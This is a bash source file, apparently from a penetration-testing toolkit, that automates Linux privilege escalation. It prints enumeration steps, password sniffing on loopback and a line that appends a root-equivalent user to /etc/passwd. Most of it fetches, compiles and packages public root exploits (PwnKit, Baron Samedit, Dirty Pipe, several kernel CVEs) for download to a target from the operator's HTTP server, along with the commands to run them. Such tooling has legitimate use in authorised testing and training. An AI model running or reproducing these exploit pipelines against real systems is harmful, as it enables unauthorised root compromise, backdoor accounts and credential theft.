#!/bin/bash
SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")
source $SCRIPTDIR/general.sh

linux_esclation_strategy() {
    echo 'Linux Manual Enumeration'
    echo "wget http://$http_ip:$http_port/linux_auto.sh"
    echo 'Linux Automatic Enumeration'
    echo 'unix_privesc_check standard'
    echo 'linpeas.sh'
    echo 'Look at the processes ruunning'
    echo 'watch -n 1 "ps -aux | grep pass"'
    echo 'sudo tcpdump -i lo -A | grep "pass"'
    echo "Look at cron jobs"
    grep "CRON" /var/log/syslog
    echo 'Adding password to /etc/passwd'
    echo 'openssl passwd w00t'
    echo 'echo "root2:$(openssl passwd w00t):0:0:root2:/root:/bin/bash" >> /etc/passwd'
    echo 'SUID'
    echo 'find / -perm -u=s -type f 2>/dev/null'
    echo 'Linux Capabilities'
    echo '/usr/sbin/getcap -r / 2>/dev/null'
    echo 'check GTFOBins for Linux'
    echo 'https://gtfobins.github.io/'
    echo 'check logs for unexpected blocks'
    echo 'cat /var/log/syslog | grep "[exploited process]"'
    echo 'Try other commands if they seem to be blocked'
    echo 'Search for kernel exploits'
    echo 'uname -r'
    echo 'arch'
    echo 'searchsploit linux kernel $(uname -r)'
}

linux_enumeration_auto() {
    echo 'Linux Manual Enumeration'
    echo "wget http://$http_ip:$http_port/linux_auto.sh"
    echo '#!/bin/bash' > linux_auto.sh
    echo 'id' >> linux_auto.sh
    echo 'cat /etc/passwd' >> linux_auto.sh
    echo 'hostname' >> linux_auto.sh
    echo 'cat /etc/issue' >> linux_auto.sh
    echo 'uname -a' >> linux_auto.sh
    echo 'ps aux' >> linux_auto.sh
    echo 'ip a' >> linux_auto.sh
    echo 'routel' >> linux_auto.sh
    echo 'ss -anp' >> linux_auto.sh
    echo 'cat /etc/iptables/rules.v4' >> linux_auto.sh
    echo 'ls -lah /etc/cron*' >> linux_auto.sh
    echo 'crontab -l' >> linux_auto.sh
    echo 'sudo crontab -l' >>  linux_auto.sh
    echo 'dpkg -l' >> linux_auto.sh
    echo 'find / -writable -type d 2>/dev/null' >> linux_auto.sh
    echo 'cat /etc/fstab' >> linux_auto.sh
    echo 'mount' >> linux_auto.sh
    echo 'lsblk' >> linux_auto.sh
    echo 'lsmod' >> linux_auto.sh
    echo '/sbin/modinfo libata' >> linux_auto.sh
    echo 'find / -perm -u=s -type f 2>/dev/null' >> linux_auto.sh
    echo 'Linux Automatic Enumeration' 
    echo 'echo "Look at user trails"' >> linux_auto.sh
    echo 'env' >> linux_auto.sh
    echo 'cat ~/.bashrc' >> linux_auto.sh
    echo 'Linux Automatic Enumeration'
    echo "wget http://$http_ip:$http_port/unix_privesc_check.sh" >> linux_auto.sh
    echo unix_privesc_check standard >> linux_auto.sh
}


download_linpeas() {
    if [ ! -f "linpeas.sh" ]; then
        linpeas_link=$(curl -s https://github.com/peass-ng/PEASS-ng/releases | grep linpeas.sh | grep -oP 'href="\K[^"]+')
        wget https://github.com$linpeas_link
    fi
    echo "wget http://$http_ip:$http_port/linpeas.sh -O linpeas.sh"
}

get_unix_privesc_check() {
    cp /usr/share/unix-privesc-check/unix-privesc-check .
    generate_linux_download unix-privesc-check
}

check_ssh_keys() {
    echo 'find / -regex ".*\.ssh.*" 2>/dev/null'
}

check_text_files() {
    echo 'find / -type f -name "*.txt" 2>/dev/null'
}

find_folders_with_write_permissions() {
    echo 'find . -type d -perm -002 -print 2>/dev/null'
}

compile_cpp() {
    if [[ -z "$target_os" ]]; then
        target_os="ubuntu:20.04"
        echo "target_os is not set, going to use the default $target_os"
    fi
    if [[ -z "$make_command" ]]; then
        make_command="make"
    fi
    if [[ ! -z "$extra_packages" ]]; then
        echo "Adding extra packages to the apt installation, $extra_packages"
    fi
    docker run -v "$(pwd):/opt/exploit" -w "/opt/exploit" --rm "$target_os" /bin/bash -c "apt update && DEBIAN_FRONTEND=noninteractive apt install -y gcc gcc-multilib binutils make $extra_packages && $make_command"

}


perform_cve_2017_16995() {
    local target_os=$1
    if [ -z "$target_os" ]; then
        target_os="ubuntu:16.04"
    fi
    local cve_dir="CVE-2017-16995"
    if [ ! -d "$cve_dir" ]; then
        mkdir "$cve_dir"
    fi
    pushd $cve_dir || exit 1
    if [ ! -f "45010.c" ]; then
        wget "https://www.exploit-db.com/download/45010" -O 45010.c
    fi
    if [ ! -f "45010" ]; then
        echo "45010 binary not found, compiling..."
        make_command="gcc -o 45010 45010.c"
        compile_cpp
    else
        echo "45010 binary already exists, skipping compilation. Remove it first if you want to recompile."
    fi
    popd || exit 1
    generate_download_linux "$cve_dir/45010" "45010"

}


get_compression_filename(){

    local cve_filename=""
    if [[ -z "$1" ]]; then
        echo "filename required"
        return 1
    else
        cve_filename="$1"
    fi
    if [[ ! -z $compression_type ]] && [[ $compression_type == "tar" ]]; then
        cve_filename="$cve_filename.tar.gz"
    else
        cve_filename="$cve_filename.zip"
    fi
    echo "$cve_filename"
}

compress_file() {
    local cve_filename="$1"
    local cve_dir="$2"
    if [[ -z $cve_filename ]]; then
        echo "cve_filename required"
        return 1
    fi
    if [[ -z "$cve_dir" ]]; then
        echo "cve_dir required"
        return 1
    fi
    if [[ ! -z $compression_type ]] && [[ $compression_type == "tar" ]]; then
        tar -czvf "$cve_filename" "$cve_dir"
    else
        zip -r "$cve_filename" "$cve_dir"
    fi
}

get_uncompress_command() {
    if [[ -z "$1" ]]; then
        echo "cve_filename required"
        return 1
    fi
    local cve_filename="$1"
    if [[ ! -z $compression_type ]] && [[ $compression_type == "tar" ]]; then
        echo "tar -xzvf $cve_filename"
    else
        echo "unzip $cve_filename"
    fi
}

#=================
#pwnkit
#=================

perform_cve_2021_4034() {

    local cve_filename="cve_2021_4034"
    cve_filename=$(get_compression_filename "$cve_filename")
    local cve_dir="CVE-2021-4034"
    if [ ! -d "$cve_dir" ]; then
        mkdir "$cve_dir"
    fi
    pushd "$cve_dir" || exit 1
    if [ ! -f 50689.txt ]; then
        searchsploit -m 50689
    fi
    if [ ! -f Makefile ]; then
        echo "Makefile not found, extracting from 50689.txt..."
        awk '
            /^[#]+ Makefile/ {
                while ((getline) > 0 && !/^[#]+$/) {
                    print
                }
                next
            }
        ' 50689.txt > Makefile
    fi

    if [ ! -f evil-so.c ]; then
        echo "evil-so.c not found, extracting from 50689.txt..."
        awk '
            /^[#]+ evil-so.c/ {
                while ((getline) > 0 && !/^[#]+$/) {
                    print
                }
                next
            }
        ' 50689.txt > evil-so.c
    fi
    if [ ! -f exploit.c ]; then
        echo "exploit.c not found, extracting from 50689.txt..."
        awk '
            /^[#]+ exploit.c/ {
                while ((getline) > 0 && !/^[#]+$/) {
                    print
                }
                next
            }
        ' 50689.txt > exploit.c
    fi
    if [[ ! -z "$compile_exploit" ]]; then
        if [ ! -f exploit ]; then
            echo "Compiling exploit..."
            compile_cpp
        else
            echo "Exploit already compiled, skipping compilation."
        fi
    fi
    popd || exit 1
    rm $cve_filename
    compress_file "$cve_filename" "$cve_dir"
    generate_download_linux $cve_filename
    get_uncompress_command "$cve_filename"

}

perform_cve_2021_3560() {
    #local url="https://raw.githubusercontent.com/f4T1H21/CVE-2021-3560-Polkit-DBus/refs/heads/main/poc.sh"
    #wget "$url" -O cve_2021_3560.sh
    if [[ ! -f "50011.sh" ]]; then
        searchsploit -m 50011
    fi
    cp 50011.sh cve_2021_3560.sh
    generate_linux_download "cve_2021_3560.sh"
}

#=============
#sudo baron
#=============

perform_cve_2021_3156() {
    local download_url="https://codeload.github.com/blasty/CVE-2021-3156/zip/main"
    local download_filename="cve_2021_3156.zip"
    local cve_filename="cve_2021_3156"
    cve_filename=$(get_compression_filename "$cve_filename")
    if [[ ! -f $download_filename ]]; then
        wget "$download_url" -O "$download_filename"
    fi
    if [[ ! -z "$compile_exploit" ]] && [[ $compile_exploit == "true" ]]; then
        echo "Compiling exploit..."
        if [[ ! -d "CVE-2021-3156-main" ]]; then
            unzip "$download_filename"
        fi
        pushd "CVE-2021-3156-main" || exit 1
        if [[ ! -f "sudo-hax-me-a-sandwich" ]]; then
            compile_cpp
        fi
        popd || exit 1
        rm $cve_filename
        compress_file "$cve_filename" "CVE-2021-3156-main"
    fi
    generate_linux_download "$cve_filename"
    echo "unzip $cve_filename"
    echo 'cd CVE-2021-3156-main'
    echo 'make'
    echo './sudo-hax-me-a-sandwich'
}


perform_cve_2021_22555() {
    local download="https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c"
    local cve_filename=$(get_compression_filename "cve_2021_22555")
    local cve_dir="CVE-2021-22555"
    if [ ! -d "$cve_dir" ]; then
        mkdir "$cve_dir"
    fi
    pushd "$cve_dir" || exit 1
    if [[ ! -f "exploit.c" ]]; then
        wget "$download" -O "exploit.c"
    fi
    if [[ ! -z "$compile_exploit" ]]; then
        if [[ ! -f "exploit" ]]; then
            echo "Compiling exploit..."
            echo "all:" > Makefile
            echo -e "\tgcc -m32 -static -o exploit -Wall exploit.c" >> Makefile
            compile_cpp
        else
            echo "Exploit already compiled, skipping compilation."
        fi
    fi
    popd || exit 1
    rm $cve_filename
    compress_file "$cve_filename" "$cve_dir"
    generate_download_linux $cve_filename
    get_uncompress_command "$cve_filename"

}

# nft object UAF
# specific to ubuntu 22.04 or somewhat newer versions
# older versions will not compile because it does not have NFT_EXPR

perform_cve_2022_32250() {
    local download_url="https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c"
    local cve_filename=$(get_compression_filename "cve_2022_32250")
    local cve_dir="CVE-2022-32250"
    echo 'Ensure you check the following packages are installed:'
    echo 'apt list --installed | grep libmnl'
    echo 'apt list --installed | grep libnftnl'
    echo 'sysctl kernel.unprivileged_userns_clone'

    if [ ! -d "$cve_dir" ]; then
        mkdir "$cve_dir"
    fi
    pushd "$cve_dir" || exit 1
    if [[ ! -f "exp.c" ]]; then
        wget "$download_url" -O "exp.c"
    fi
    if [[ ! -z "$compile_exploit" ]]; then
        if [ ! -f exp ]; then
            echo "Compiling exploit..."
            echo "all:" > Makefile
            echo -e "\tgcc -o exp exp.c -lmnl -lnftnl -w -Wno-error=implicit-function-declaration" >> Makefile
            extra_packages="libmnl-dev libnftnl-dev"
            compile_cpp
        else
            echo "Exploit already compiled, skipping compilation."
        fi
    fi
    popd || exit 1
    rm $cve_filename
    compress_file "$cve_filename" "$cve_dir"
    generate_linux_download "$cve_filename"
    get_uncompress_command "$cve_filename"
    echo "cd $cve_dir"
    echo "make"
    echo "./exp"
}

# specific to ubuntu 22.04 or somewhat newer versions
# https://ubuntu.com/security/CVE-2022-2586
# confirm libmnl and libnftnl are installed

perform_cve_2022_2586() {
    local download_url="https://www.openwall.com/lists/oss-security/2022/08/29/5/1"
    local cve_filename=$(get_compression_filename "cve_2022_2586")
    local cve_dir="CVE-2022-2586"
    echo 'Ensure you check the following packages are installed:'
    echo 'apt list --installed | grep libmnl'
    echo 'apt list --installed | grep libnftnl'
    echo 'sysctl kernel.unprivileged_userns_clone'

    if [ ! -d "$cve_dir" ]; then
        mkdir "$cve_dir"
    fi
    pushd "$cve_dir" || exit 1
    if [[ ! -f "exploit.c" ]]; then
        wget "$download_url" -O "exploit.c"
    fi
    if [[ ! -z "$compile_exploit" ]]; then
        if [[ ! -f "exploit" ]]; then
            echo "Compiling exploit..."
            echo "all:" > Makefile
            echo -e "\tgcc exploit.c -lmnl -lnftnl -no-pie -lpthread -w -o exploit" >> Makefile
            extra_packages="libmnl-dev libnftnl-dev"
            compile_cpp
        else
            echo "Exploit already compiled, skipping compilation."
        fi
    fi
    popd || exit 1
    rm $cve_filename
    compress_file "$cve_filename" "$cve_dir"
    generate_linux_download "$cve_filename"
    get_uncompress_command "$cve_filename"
    echo "cd $cve_dir"
    echo "make"
    echo "./exploit"
}

#=========================
# Dirty pipe
# https://dirtypipe.cm4all.com/
#=========================

perform_cve_2022_0847() {
    local download_url="https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/archive/refs/heads/main.zip"
    local download_filename="cve_2022_0847.zip"
    local cve_dir="CVE-2022-0847-DirtyPipe-Exploits-main"
    if [[ ! -f "$download_filename" ]]; then
        wget "$download_url" -O "$download_filename"
    fi
    unzip "$download_filename"
    pushd "$cve_dir" || exit 1
    if [[ ! -z "$compile_exploit" ]]; then
        if [[ ! -f "exploit-1" ]] && [[ ! -f "exploit-2" ]]; then
            echo "Compiling exploit..."
            make_command="chmod a+x compile.sh; ./compile.sh"
            compile_cpp
        else
            echo "Exploit already compiled, skipping compilation."
        fi
    fi
    popd || exit 1
    local cve_filename=$(get_compression_filename "cve_2022_0847")
    rm $cve_filename
    compress_file "$cve_filename" "$cve_dir"
    generate_linux_download "$cve_filename"
    get_uncompress_command "$cve_filename"
    echo "cd $cve_dir"
    echo "chmod a+x compile.sh"
    echo "./compile.sh"
    echo "./exploit-1"
    echo "./exploit-2"  
}
